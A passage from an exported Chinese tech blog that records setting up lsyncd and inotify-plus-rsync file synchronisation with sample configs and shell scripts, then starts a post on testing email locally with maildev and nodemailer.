href=\"/blog/2020/04/25/lsyncd-做檔案同步實作紀錄/web1.png\" title=\"備份圖\">備份圖</a><br>為了不浪費時間<br>所以我就不實作了</p>\n<h2 id=\"lsyncd\"><a href=\"#lsyncd\" class=\"headerlink\" title=\"lsyncd\"></a>lsyncd</h2><h3 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h3><p>apt install rsyncd</p>\n<p>或去 github 官網抓 <a href=\"https://github.com/axkibe/lsyncd\" target=\"_blank\" rel=\"noopener\">axkibe/lsyncd: Lsyncd (Live Syncing Daemon) synchronizes local directories with remote targets</a></p>\n<h4 id=\"lua-記得要升到-5-2\"><a href=\"#lua-記得要升到-5-2\" class=\"headerlink\" title=\"lua 記得要升到 5.2\"></a>lua 記得要升到 5.2</h4><p>Lua &gt;= 5.2</p>\n<p>Lsyncd depends on Lua 5.2 or greater; that is 5.2 or 5.3. For most distributions you need to install the liblua??, the liblua??-dev and the lua?? package, with ?? being the respective Lua version.<br>cmake &gt;= 2.8</p>\n<p>To configure Lsyncd to your system, cmake &gt;= 2.8 is required<br>rsync &gt;= 3.1</p>\n<p>During runtime Lsyncd needs rsync &gt; 3.1 installed both on source and target systems.</p>\n<p><a href=\"https://axkibe.github.io/lsyncd/manual/building/\" target=\"_blank\" rel=\"noopener\">Lsyncd - Building</a></p>\n<h3 id=\"設定\"><a href=\"#設定\" class=\"headerlink\" title=\"設定\"></a>設定</h3><p>一開始不會有<code>/etc/lsyncd.conf</code><br>可以做 <code>service lsync status</code> 有沒有執行</p>\n<p><del>vim /etc/lsyncd.conf</del> 網路上看到是這個路徑<br>但是我看<code>CONFIG=/etc/lsyncd/lsyncd.conf.lua</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 全域設定</span><br><span class=\"line\">settings &#123;</span><br><span class=\"line\">    logfile = &quot;/var/log/lsyncd/lsyncd.log&quot;,</span><br><span class=\"line\">    statusFile = &quot;/var/log/lsyncd/lsyncd.status&quot;</span><br><span class=\"line\">    inotifyMode = &quot;CloseWrite&quot;,</span><br><span class=\"line\">    maxProcesses = 8,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">## 以下設定參考 https://www.centos.bz/2017/08/lsyncd-rsync-inotify/</span><br><span class=\"line\"># 可設定多組</span><br><span class=\"line\"># I. 本地目錄同步，direct：cp/rm/mv。 適用：500+萬文件，變動不大</span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">    default.direct,</span><br><span class=\"line\">    source    = &quot;/tmp/src&quot;,</span><br><span class=\"line\">    target    = &quot;/tmp/dest&quot;,</span><br><span class=\"line\">    delay = 1</span><br><span class=\"line\">    maxProcesses = 1</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># II. 本地目錄同步，rsync模式：rsync</span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">    default.rsync,</span><br><span class=\"line\">    source    = &quot;/tmp/src&quot;,</span><br><span class=\"line\">    target    = &quot;/tmp/dest1&quot;,</span><br><span class=\"line\">    excludeFrom = &quot;/etc/rsyncd.d/rsync_exclude.lst&quot;,</span><br><span class=\"line\">    rsync     = &#123;</span><br><span class=\"line\">        binary = &quot;/usr/bin/rsync&quot;,</span><br><span class=\"line\">        archive = true,</span><br><span class=\"line\">        compress = true,</span><br><span class=\"line\">        bwlimit   = 2000</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># III. 遠程目錄同步，rsync模式 + rsyncd daemon</span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">    default.rsync,</span><br><span class=\"line\">    source    = &quot;/tmp/src&quot;,</span><br><span class=\"line\">    target    = &quot;syncuser@172.29.88.223::module1&quot;,</span><br><span class=\"line\">    delete=&quot;running&quot;,  # 可以改成false 這樣就不會刪掉</span><br><span class=\"line\">    exclude = &#123; &quot;.*&quot;, &quot;.tmp&quot; &#125;,</span><br><span class=\"line\">    delay = 30,</span><br><span class=\"line\">    init = false, # 默認init功能設置為false來跳過初始rsync過程</span><br><span class=\"line\">    rsync     = &#123;</span><br><span class=\"line\">        binary = &quot;/usr/bin/rsync&quot;,</span><br><span class=\"line\">        archive = true,</span><br><span class=\"line\">        compress = true,</span><br><span class=\"line\">        verbose   = true,</span><br><span class=\"line\">        password_file = &quot;/etc/rsyncd.d/rsync.pwd&quot;,</span><br><span class=\"line\">        _extra    = &#123;&quot;--bwlimit=200&quot;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># IV. 遠程目錄同步，rsync模式 + ssh shell</span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">    default.rsync,</span><br><span class=\"line\">    source    = &quot;/tmp/src&quot;,</span><br><span class=\"line\">    target    = &quot;172.29.88.223:/tmp/dest&quot;,</span><br><span class=\"line\">    # target    = &quot;root@172.29.88.223:/remote/dest&quot;,</span><br><span class=\"line\">    # 上面target，注意如果是普通用戶，必須擁有寫權限</span><br><span class=\"line\">    maxDelays = 5,</span><br><span class=\"line\">    delay = 30,</span><br><span class=\"line\">    # init = true,</span><br><span class=\"line\">    rsync     = &#123;</span><br><span class=\"line\">        binary = &quot;/usr/bin/rsync&quot;,</span><br><span class=\"line\">        archive = true,</span><br><span class=\"line\">        compress = true,</span><br><span class=\"line\">        bwlimit   = 2000</span><br><span class=\"line\">        # rsh = &quot;/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no&quot;</span><br><span class=\"line\">        # 如果要指定其它端口，請用上面的rsh</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># V. 遠程目錄同步，rsync模式 + rsyncssh，效果與上面相同</span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">    default.rsyncssh,</span><br><span class=\"line\">    source    = &quot;/tmp/src2&quot;,</span><br><span class=\"line\">    host      = &quot;172.29.88.223&quot;,</span><br><span class=\"line\">    targetdir = &quot;/remote/dir&quot;,</span><br><span class=\"line\">    excludeFrom = &quot;/etc/rsyncd.d/rsync_exclude.lst&quot;,</span><br><span class=\"line\">    # maxDelays = 5,</span><br><span class=\"line\">    delay = 0,</span><br><span class=\"line\">    # init = false,</span><br><span class=\"line\">    rsync    = &#123;</span><br><span class=\"line\">        binary = &quot;/usr/bin/rsync&quot;,</span><br><span class=\"line\">        archive = true,</span><br><span class=\"line\">        compress = true,</span><br><span class=\"line\">        verbose   = true,</span><br><span class=\"line\">        _extra = &#123;&quot;--bwlimit=2000&quot;&#125;,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    ssh      = &#123;</span><br><span class=\"line\">        port  =  1234</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>default.direct</strong></p>\n<p>Default.direct可以用來保持兩個本地目錄同步，比使用default.rsync更好的性能。Default.direct在啟動時使用（就像default.rsync一樣）rsync來初始化目標目錄與源目錄的同步。但是，在正常操作期間，default.direct使用/ bin / cp，/ bin / rm和/ bin / mv來保持同步。所有參數就像default.rsync一樣。</p>\n<p>delete 也適用這個屬性</p>\n<p><strong>_extra  可放一些參數</strong></p>\n<p>想說有沒有 size-only 設定<br>但發現都找不到<br>後來看到<code>_extra</code> 可以設定</p>\n<h3 id=\"簡單測試\"><a href=\"#簡單測試\" class=\"headerlink\" title=\"簡單測試\"></a>簡單測試</h3><p>預設是 10 秒檢查資料更新<br>可設定 statusInterval<br><a href=\"https://axkibe.github.io/lsyncd/manual/config/file/\" target=\"_blank\" rel=\"noopener\">Lsyncd - The Configuration File</a></p>\n<figure class=\"highlight lua\"><table><tr><td class=\"code\"><pre><span class=\"line\">settings &#123;</span><br><span class=\"line\">   logfile    = <span class=\"string\">\"/tmp/lsyncd.log\"</span>,</span><br><span class=\"line\">   statusFile = <span class=\"string\">\"/tmp/lsyncd.status\"</span>,</span><br><span class=\"line\">   nodaemon   = <span class=\"literal\">true</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sync &#123;</span><br><span class=\"line\">   default.rsync,</span><br><span class=\"line\">   source = <span class=\"string\">\"/home/malagege/test_lsyncd/a/\"</span>,</span><br><span class=\"line\">   target = <span class=\"string\">\"/home/malagege/test_lsyncd/b/\"</span>,</span><br></pre></td></tr></table></figure>\n<p>default.rsync 預設是執行<br>/usr/bin/rsync -ltsd –delete –include-from=- –exclude=* SOURCE TARGET<br>所以會做刪除動作</p>\n<h2 id=\"同步完做動作\"><a href=\"#同步完做動作\" class=\"headerlink\" title=\"同步完做動作\"></a>同步完做動作</h2><p><a href=\"https://axkibe.github.io/lsyncd/faq/postscript/\" target=\"_blank\" rel=\"noopener\">Lsyncd - FAQ: How can I call a script before or after each rsync operation?</a></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">/usr/bin/rsync <span class=\"string\">\"<span class=\"variable\">$@</span>\"</span></span><br><span class=\"line\">result=$?</span><br><span class=\"line\">(</span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$result</span> -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">     <span class=\"built_in\">echo</span> <span class=\"string\">\"my commands\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">) &gt;/dev/null 2&gt;/dev/null &lt;/dev/null</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span> <span class=\"variable\">$result</span></span><br></pre></td></tr></table></figure>\n<p>這邊注意 rsync 並不是對單一檔案做搬移<br>而是對整個…<br>echo $@ 結果是<br><code>-slt -r --delete --ignore-errors --force --from0 --include-from=- --exclude=* /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/b/</code></p>\n<p>跟我想要抓的東西不一樣</p>\n<h2 id=\"可能做-Layer-2-做自訂動作\"><a href=\"#可能做-Layer-2-做自訂動作\" class=\"headerlink\" title=\"可能做 Layer 2 做自訂動作\"></a>可能做 Layer 2 做自訂動作</h2><p>感覺這邊自由度很高<br>因為我對 lua 不熟<br>所以就沒打算做這段</p>\n<ul>\n<li><a href=\"https://gowa.club/Linux-Unix/%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8Lsyncd%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E9%95%9C%E5%83%8F%E5%90%8C%E6%AD%A5.html\" target=\"_blank\" rel=\"noopener\">關於使用Lsyncd進行數據鏡像同步 | 退思園</a> <a href=\"/blog/2020/04/25/lsyncd-做檔案同步實作紀錄/web2.png\" title=\"備份圖\">備份圖</a><br>裡面有官方中文說明</li>\n</ul>\n<h2 id=\"其他參考\"><a href=\"#其他參考\" class=\"headerlink\" title=\"其他參考\"></a>其他參考</h2><ul>\n<li><a href=\"https://axkibe.github.io/lsyncd/manual/examples/\" target=\"_blank\" rel=\"noopener\">Lsyncd - Examples</a></li>\n<li><a href=\"https://www.cnblogs.com/jiangzhaowei/p/8298416.html\" target=\"_blank\" rel=\"noopener\">Lsyncd搭建同步镜像-用Lsyncd实现本地和远程服务器之间实时同步 - 江召伟 - 博客园</a></li>\n<li><a href=\"https://gowa.club/Linux-Unix/Bash%E4%B8%AD%E7%9A%84IO%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91.html\" target=\"_blank\" rel=\"noopener\">Bash中的IO與重定向 | 退思園</a></li>\n<li><a href=\"http://news.migage.com/articles/lsyncdrsync+%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5_3575751_csdn.html\" target=\"_blank\" rel=\"noopener\">lsyncd+rsync 实时同步</a></li>\n<li><a href=\"https://www.centos.bz/2017/08/lsyncd-rsync-inotify/\" target=\"_blank\" rel=\"noopener\">lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志</a></li>\n<li><a href=\"https://www.zhihu.com/question/26463409\" target=\"_blank\" rel=\"noopener\">做网站迁移 大量的小文件怎么办？ - 知乎</a></li>\n</ul>\n<h3 id=\"同步腳本\"><a href=\"#同步腳本\" class=\"headerlink\" title=\"同步腳本\"></a>同步腳本</h3><p>以下都是參考:<a href=\"https://www.cnblogs.com/ginvip/p/6430986.html\" target=\"_blank\" rel=\"noopener\">真正的inotify+rsync实时同步 彻底告别同步慢 - 琴酒网络 - 博客园</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">/usr/bin/inotifywait -mrq --format <span class=\"string\">'%w%f'</span>-e create,close_write,delete /backup |<span class=\"keyword\">while</span> <span class=\"built_in\">read</span> file</span><br><span class=\"line\"><span class=\"comment\">#把發生更改的文件列表都接收到file 然後循環，但有什麼鬼用呢？下面的命令都沒有引用這個$file 下面做的是全量rsync</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">cd</span> /backup &amp;&amp; rsync -az --delete /backup/ rsync_backup@192.168.24.101::backup/--password-file=/etc/rsync.password</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>優化</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">src=/data/                           <span class=\"comment\"># 需要同步的源路徑</span></span><br><span class=\"line\">des=data                             <span class=\"comment\"># 目標服務器上 rsync --daemon 發佈的名稱，rsync --daemon這裡就不做介紹了，網上搜一下，比較簡單。</span></span><br><span class=\"line\">rsync_passwd_file=/etc/rsyncd.passwd            <span class=\"comment\"># rsync驗證的密碼文件</span></span><br><span class=\"line\">ip1=192.168.0.18                 <span class=\"comment\"># 目標服務器1</span></span><br><span class=\"line\">ip2=192.168.0.19                 <span class=\"comment\"># 目標服務器2</span></span><br><span class=\"line\">user=root                            <span class=\"comment\"># rsync --daemon定義的驗證用戶名</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> <span class=\"variable\">$&#123;src&#125;</span>                            </span><br><span class=\"line\"><span class=\"comment\"># 此方法中，由於rsync同步的特性，這裡必須要先cd到源目錄，inotify再監聽 ./ 才能rsync同步後目錄結構一致，有興趣的同學可以進行各種嘗試觀看其效果</span></span><br><span class=\"line\">/usr/<span class=\"built_in\">local</span>/bin/inotifywait -mrq --format  <span class=\"string\">'%Xe %w%f'</span> -e modify,create,delete,attrib,close_write,move ./ | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> file</span><br><span class=\"line\"><span class=\"comment\"># 把監控到有發生更改的\"文件路徑列表\"循環</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        INO_EVENT=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$file</span> | awk <span class=\"string\">'&#123;print $1&#125;'</span>)      <span class=\"comment\"># 把inotify輸出切割 把事件類型部分賦值給INO_EVENT</span></span><br><span class=\"line\">        INO_FILE=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$file</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span>)       <span class=\"comment\"># 把inotify輸出切割 把文件路徑部分賦值給INO_FILE</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"-------------------------------<span class=\"variable\">$(date)</span>------------------------------------\"</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$file</span></span><br><span class=\"line\">        <span class=\"comment\">#增加、修改、寫入完成、移動進事件</span></span><br><span class=\"line\">        <span class=\"comment\">#增、改放在同一個判斷，因為他們都肯定是針對文件的操作，即使是新建目錄，要同步的也只是一個空目錄，不會影響速度。</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'CREATE'</span> ]] || [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'MODIFY'</span> ]] || [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'CLOSE_WRITE'</span> ]] || [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'MOVED_TO'</span> ]]         <span class=\"comment\"># 判斷事件類型</span></span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">'CREATE or MODIFY or CLOSE_WRITE or MOVED_TO'</span></span><br><span class=\"line\">                rsync -avzcR --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip1&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span> &amp;&amp;</span><br><span class=\"line\"><span class=\"comment\"># INO_FILE變量代表路徑哦  -c校驗文件內容</span></span><br><span class=\"line\">                rsync -avzcR --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip2&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#仔細看 上面的rsync同步命令 源是用了$(dirname $&#123;INO_FILE&#125;)變量 即每次只針對性的同步發生改變的文件的目錄(只同步目標文件的方法在生產環境的某些極端</span></span><br><span class=\"line\"><span class=\"comment\">#環境下會漏文件 現在可以在不漏文件下也有不錯的速度 做到平衡)</span></span><br><span class=\"line\"><span class=\"comment\">#然後用-R參數把源的目錄結構遞歸到目標後面 保證目錄結構一致性</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">        <span class=\"comment\">#刪除、移動出事件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'DELETE'</span> ]] || [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'MOVED_FROM'</span> ]]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">'DELETE or MOVED_FROM'</span></span><br><span class=\"line\">                rsync -avzR --delete --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip1&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span> &amp;&amp;</span><br><span class=\"line\">                rsync -avzR --delete --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip2&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#看rsync命令 如果直接同步已刪除的路徑$&#123;INO_FILE&#125;會報no such or directory錯誤 所以這裡同步的源是被刪文件或目錄的上一級路徑</span></span><br><span class=\"line\"><span class=\"comment\">#並加上--delete來刪除目標上有而源中沒有的文件，這裡不能做到指定文件刪除，如果刪除的路徑越靠近根，則同步的目錄月多，同步刪除的操作就越花時間。</span></span><br><span class=\"line\"><span class=\"comment\">#這裡有更好方法的同學，歡迎交流。</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">        <span class=\"comment\">#修改屬性事件 指 touch chgrp chmod chown等操作</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> [[ <span class=\"variable\">$INO_EVENT</span> =~ <span class=\"string\">'ATTRIB'</span> ]]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">'ATTRIB'</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> [ ! -d <span class=\"string\">\"<span class=\"variable\">$INO_FILE</span>\"</span> ]</span><br><span class=\"line\"><span class=\"comment\"># 如果修改屬性的是目錄 則不同步，因為同步目錄會發生遞歸掃瞄，等此目錄下的文件發生同步時，rsync會順帶更新此目錄。</span></span><br><span class=\"line\">                <span class=\"keyword\">then</span></span><br><span class=\"line\">                        rsync -avzcR --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip1&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span> &amp;&amp;         </span><br><span class=\"line\">                        rsync -avzcR --password-file=<span class=\"variable\">$&#123;rsync_passwd_file&#125;</span> $(dirname <span class=\"variable\">$&#123;INO_FILE&#125;</span>) <span class=\"variable\">$&#123;user&#125;</span>@<span class=\"variable\">$&#123;ip2&#125;</span>::<span class=\"variable\">$&#123;des&#125;</span></span><br><span class=\"line\">                <span class=\"keyword\">fi</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>簡單來看就是對檔案做 dirname 備份，減少做多次遞迴<br>是不是能確認來源是資料夾或檔案，單純 scp 或 rsync 過去是不是比較快?</p>\n<h2 id=\"相關同步數量問題\"><a href=\"#相關同步數量問題\" class=\"headerlink\" title=\"相關同步數量問題\"></a>相關同步數量問題</h2><p>以下參考:<a href=\"https://www.iq180.com.tw/2018/08/lsyncd-live-syncing-daemon.html\" target=\"_blank\" rel=\"noopener\">等很久資訊室: Lsyncd - Live syncing Daemon 資料夾同步</a></p>\n<p>檢查可監測數量設定值：<br>lsyncd 是依靠 kernel 內建的檔案監測功能 inotify，來回報記錄檔案狀態，而 inotify 預設有設定了一個可監測資料夾數量的限定值。</p>\n<p>cat /proc/sys/fs/inotify/max_user_watches</p>\n<p>在 CentOS 6.8 內，它預設值是 8192，也就是它只能監測最多 8192 個資料夾。<br>而我們要同步的資料夾有多少，會不會超過這個數值呢？必竟，若是超過了，它就無法同步到了。</p>\n<p>cat /var/run/lsyncd/lsyncd.status</p>\n<p>在狀態檔中找到一行如下：<br>Inotify watching 1440 directories<br>那數字便是目前 lsyncd 所監測的資料夾數量。<br>如果您看到的數字很靠近 8192 或甚至超過，那就必須放大這個限定值。</p>\n<p>echo ‘10000’ &gt; /proc/sys/fs/inotify/max_user_watches</p>\n<p>這樣可以即時把限定值改成 10000，但重開機後它又會變成原本的 8192。<br>下面方法可以改變開機後的預設值：</p>\n<p>把上述即時修改的指令放到 rc.local 之類的開機啟動檔內。<br>或是<br>在 /etc/sysctl.conf 內加上一行<br>fs.inotify.max_user_watches = 10000</p>\n<p>這樣它重開機後，一樣會放大成我們設定的數值。</p>\n","categories":["Linux"],"tags":["lsyncd"]},{"title":"maildev試用筆記","url":"/blog/2018/12/09/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/","content":"<p>最近在FB社群看到有人分享fake stmp server<br><a href=\"https://www.facebook.com/groups/javascript.tw/permalink/1620946454673353/\" target=\"_blank\" rel=\"noopener\">社群連結</a><br>之前有測試nodemailer<br>但是缺少附加檔案可以測試<br><a href=\"https://www.npmjs.com/package/preview-email\" target=\"_blank\" rel=\"noopener\">preview-email - npm</a>無法做到<br>想說測試這個能不能用</p>\n<a id=\"more\"></a>\n<p>線上服務<br><a href=\"https://ethereal.email/?fbclid=IwAR1_1vsbOR2U5V3MeFFCyNAvvbkh4gVQxtyif-oJZrhDTdtFQMdUmAKLuG8\" target=\"_blank\" rel=\"noopener\">Ethereal Email</a><br><a href=\"https://mailtrap.io/\" target=\"_blank\" rel=\"noopener\">Mailtrap.io — Fake smtp testing server. Dummy smtp email testing</a><br>不過…，這兩個不是這文章的重點</p>\n<h2 id=\"maildev-安裝\"><a href=\"#maildev-安裝\" class=\"headerlink\" title=\"maildev 安裝\"></a>maildev 安裝</h2><p>官網<a href=\"https://danfarrelly.nyc/MailDev/?fbclid=IwAR26sE6dCMfjn9xeNhWJh_nLfw3cTiPu-pr5F9nd0qJyykPCaI7ihQDBR-8\" target=\"_blank\" rel=\"noopener\">MailDev - Create better email during development</a>寫了很清楚</p>\n<h3 id=\"npm安裝\"><a href=\"#npm安裝\" class=\"headerlink\" title=\"npm安裝\"></a>npm安裝</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ npm install -g maildev</span><br><span class=\"line\">$ maildev</span><br></pre></td></tr></table></figure>\n<h3 id=\"docker執行\"><a href=\"#docker執行\" class=\"headerlink\" title=\"docker執行\"></a>docker執行</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ docker pull djfarrelly/maildev</span><br><span class=\"line\">$ docker run -p 1080:80 -p 1025:25 djfarrelly/maildev</span><br></pre></td></tr></table></figure>\n<h3 id=\"原始檔案暗樁\"><a href=\"#原始檔案暗樁\" class=\"headerlink\" title=\"原始檔案暗樁\"></a>原始檔案暗樁</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git clone git@github.com:djfarrelly/MailDev.git</span><br><span class=\"line\">$ npm install -g ./maildev</span><br><span class=\"line\">$ maildev</span><br></pre></td></tr></table></figure>\n<h2 id=\"安全憑證記得要關掉\"><a href=\"#安全憑證記得要關掉\" class=\"headerlink\" title=\"安全憑證記得要關掉\"></a>安全憑證記得要關掉</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> transport = nodemailer.createTransport(&#123;</span><br><span class=\"line\">  port: <span class=\"number\">1025</span>,</span><br><span class=\"line\">  ignoreTLS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"comment\">// other settings...</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"程式碼執行\"><a href=\"#程式碼執行\" class=\"headerlink\" title=\"程式碼執行\"></a>程式碼執行</h3><p>拿<a href=\"https://github.com/malagege/sample-code-node-mail-batch\" target=\"_blank\" rel=\"noopener\">malagege/sample-code-node-mail-batch: 批次發信範例</a>test_add_file.js<br>修改<br>主要要特別注意</p>\n<ul>\n<li>ignoreTLS: true</li>\n<li>auth要拿掉</li>\n<li>cid 在多個寄信的時候會在寄信的時候會有問題….<br>明明個別設定1.jpg,2.jpg，但是結果兩封信卻都是2.jpg<br>最後用<code>cid:00000001${data.img}</code>方式解決…<br>但感覺是maildev問題…</li>\n</ul>\n<p>以下code也沒先commit到github上面<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/////////(1)</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> csvFilePath=<span class=\"string\">'data.csv'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mail_from = <span class=\"string\">'from@xxxx.com.tw'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> subject = <span class=\"string\">'標題'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> nodemailer = <span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> csv=<span class=\"built_in\">require</span>(<span class=\"string\">'csvtojson'</span>)</span><br><span class=\"line\"><span class=\"comment\">/////////(2)</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">    host: <span class=\"string\">'localhost'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">1025</span> ,</span><br><span class=\"line\">    ignoreTLS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// auth: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     user: 'from@xxxx.com.tw',</span></span><br><span class=\"line\">    <span class=\"comment\">//     pass: 'password'</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">csv()</span><br><span class=\"line\">.fromFile(csvFilePath)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">jsonObj</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// console.log(jsonObj);</span></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [</span></span><br><span class=\"line\"><span class=\"comment\">     * \t&#123;a:\"1\", b:\"2\", c:\"3\"&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">     * \t&#123;a:\"4\", b:\"5\". c:\"6\"&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * ]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    jsonObj.forEach(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/////////(3)</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> mail_to = data.usermail</span><br><span class=\"line\">        <span class=\"keyword\">let</span> email_template = <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">        Hello World!!!!<span class=\"subst\">$&#123;data.img&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">        &lt;img src=\"cid:00000001<span class=\"subst\">$&#123;data.img&#125;</span>\"/&gt;&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        姓名：<span class=\"subst\">$&#123;data.username&#125;</span>&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        訂單編號：<span 